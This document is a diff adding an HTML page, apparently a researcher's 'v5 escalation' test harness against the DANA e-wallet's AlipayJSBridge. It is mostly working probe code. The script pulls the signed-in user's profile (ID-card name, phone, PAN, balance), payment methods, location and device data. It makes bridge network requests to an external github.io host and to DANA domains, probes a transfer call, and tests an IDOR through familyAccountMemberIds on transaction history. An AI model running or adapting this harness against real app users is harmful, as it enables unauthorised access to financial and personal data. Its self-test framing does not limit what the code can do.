@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v5</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:12px;margin:6px 0;font-size:14px;width:100%}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+</style>
+</head>
+<body>
+<div id="status">v5 starting...</div>
+<h3 style="color:#0ff">v5 - escalation: native-network, location, pay methods, IDOR self-test</h3>
+<p class="note">RUN THIS VIA: open v4.html first, then tap the &quot;OPEN v5 VIA callSubApp&quot; button (in-session = network bridges work). Let it run until DONE. Watch for: any permission dialog (location), any native dialog. Then COPY ALL. NOTE the title bar: is any DOMAIN/URL shown up there?</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+<h3>[1] full profile (getUserInformation+queryBy) + extract userId</h3><pre id="p-1" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-1')">copy [1]</button>
+<h3>[2] networkRequest GET external (github.io/ping.txt)</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] networkRequest GET m.dana.id</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] networkRequest GET mgs.dana.id</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] queryPayMethod</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] getSecurityLevelInfo</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] getLocationInfo (watch for dialog!)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] getAkuDeviceInfo</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] getUserStatus</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] pushVerifyChallenge (error mapping)</h3><pre id="p-10" class="pending">pending</pre>
+<h3>[11] requestApi (error mapping)</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] contacts checkContactPermission (mapping only)</h3><pre id="p-12" class="pending">pending</pre>
+<h3>[13] getNmidQR (error mapping)</h3><pre id="p-13" class="pending">pending</pre>
+<h3>[14] transfer INVALID params (reachability only - nothing can execute)</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] trx history + familyAccountMemberIds:[own userId] (IDOR self-test)</h3><pre id="p-15" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-15')">copy [15]</button>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||12000}); } }, timeoutMs || 12000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+
+  window.copyAll = function(){
+    var lines = [];
+    Object.keys(RESULTS).forEach(function(k){ lines.push(k + ': ' + compact(RESULTS[k])); });
+    var ta = document.createElement('textarea');
+    ta.value = 'v5 @ ' + location.href + '\n' + lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  bridgeReady(async function(){
+    try {
+      var sp = {};
+      try { sp = (window.AlipayJSBridge && window.AlipayJSBridge.startupParams) || {}; } catch(e) { sp = {err:String(e)}; }
+      set('p-0', { hasAlipayJSBridge: !!window.AlipayJSBridge, appId: sp.appId, href: location.href });
+    } catch(e) { set('p-0', {error:String(e)}, 'err'); }
+
+    status('[1/15] full profile');
+    var prof = await call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'ktpName,globalPhoneNumber,userPan,userId,kycLevel,balance'}}, 20000);
+    set('p-1', prof);
+    var ownId = null;
+    try {
+      ownId = (prof && prof.queryData && prof.queryData.userId) || null;
+      if (ownId) status('own userId captured: ' + ownId);
+    } catch(e) {}
+
+    status('[2/15] networkRequest external');
+    set('p-2', await call('networkRequest', {url:'https://rfypych.github.io/poc/ping.txt', method:'GET', headers:{}, timeout:10000, dataType:'text'}, 15000));
+
+    status('[3/15] networkRequest m.dana.id');
+    set('p-3', await call('networkRequest', {url:'https://m.dana.id/', method:'GET', headers:{}, timeout:10000, dataType:'text'}, 15000));
+
+    status('[4/15] networkRequest mgs.dana.id');
+    set('p-4', await call('networkRequest', {url:'https://mgs.dana.id/', method:'GET', headers:{}, timeout:10000, dataType:'text'}, 15000));
+
+    status('[5/15] queryPayMethod');
+    set('p-5', await call('queryPayMethod', {}, 12000));
+
+    status('[6/15] getSecurityLevelInfo');
+    set('p-6', await call('getSecurityLevelInfo', {}, 12000));
+
+    status('[7/15] getLocationInfo - WATCH FOR DIALOG');
+    set('p-7', await call('getLocationInfo', {}, 20000));
+
+    status('[8/15] getAkuDeviceInfo');
+    set('p-8', await call('getAkuDeviceInfo', {}, 10000));
+
+    status('[9/15] getUserStatus');
+    set('p-9', await call('getUserStatus', {}, 10000));
+
+    status('[10/15] pushVerifyChallenge');
+    set('p-10', await call('pushVerifyChallenge', {}, 12000));
+
+    status('[11/15] requestApi');
+    set('p-11', await call('requestApi', {operationType:'', payload:{}}, 12000));
+
+    status('[12/15] contacts check');
+    set('p-12', await call('contacts', {event:'checkContactPermission'}, 12000));
+
+    status('[13/15] getNmidQR');
+    set('p-13', await call('getNmidQR', {}, 12000));
+
+    status('[14/15] transfer INVALID (reachability only)');
+    set('p-14', await call('transfer', {data:{}}, 15000));
+
+    status('[15/15] trx + familyAccountMemberIds self-test');
+    var fam = {event:'getInitList', pageNum:1, forceCache:true};
+    if (ownId) { fam.familyAccountMemberIds = [ownId]; fam.note = 'familyAccountMemberIds=[own userId ' + ownId + ']'; }
+    set('p-15', await call('getTransactionHistoryList', fam, 20000));
+
+    status('DONE - copy all + copy [1] and [15] separately if long');
+  });
+})();
+</script>
+</body>
+</html>
